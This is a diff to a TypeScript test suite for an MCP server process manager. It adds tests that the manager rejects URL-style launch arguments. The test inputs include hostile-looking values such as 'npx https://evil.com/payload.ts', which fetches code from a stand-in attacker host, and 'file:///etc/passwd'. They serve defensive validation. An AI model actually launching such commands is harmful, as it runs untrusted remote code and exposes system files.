@@ -67,9 +67,34 @@ describe('McpProcessManager', () => {
     await expect(manager.startServer('s1')).rejects.toThrow("Argument '-e' is not permitted")
   })
 
-  it('URL 형태 arg는 throw', async () => {
+  it('https:// URL arg는 throw', async () => {
     await manager.addServer({ id: 's1', name: 's1', command: 'npx', args: ['https://evil.com/payload.ts'], env: {}, autoStart: false })
     await expect(manager.startServer('s1')).rejects.toThrow('URL arguments are not permitted')
+  })
+
+  it('http:// URL arg는 throw', async () => {
+    await manager.addServer({ id: 's2', name: 's2', command: 'npx', args: ['http://evil.com/pkg'], env: {}, autoStart: false })
+    await expect(manager.startServer('s2')).rejects.toThrow('URL arguments are not permitted')
+  })
+
+  it('file:// URL arg는 throw', async () => {
+    await manager.addServer({ id: 's3', name: 's3', command: 'deno', args: ['file:///etc/passwd'], env: {}, autoStart: false })
+    await expect(manager.startServer('s3')).rejects.toThrow('URL arguments are not permitted')
+  })
+
+  it('data: URL arg는 throw', async () => {
+    await manager.addServer({ id: 's4', name: 's4', command: 'npx', args: ['data://text/plain,evil'], env: {}, autoStart: false })
+    await expect(manager.startServer('s4')).rejects.toThrow('URL arguments are not permitted')
+  })
+
+  it('javascript: URL arg는 throw', async () => {
+    await manager.addServer({ id: 's5', name: 's5', command: 'npx', args: ['javascript://alert(1)'], env: {}, autoStart: false })
+    await expect(manager.startServer('s5')).rejects.toThrow('URL arguments are not permitted')
+  })
+
+  it('ftp:// URL arg는 throw', async () => {
+    await manager.addServer({ id: 's6', name: 's6', command: 'npx', args: ['ftp://example.com/file'], env: {}, autoStart: false })
+    await expect(manager.startServer('s6')).rejects.toThrow('URL arguments are not permitted')
   })
 
   it('차단된 env 키는 throw', async () => {
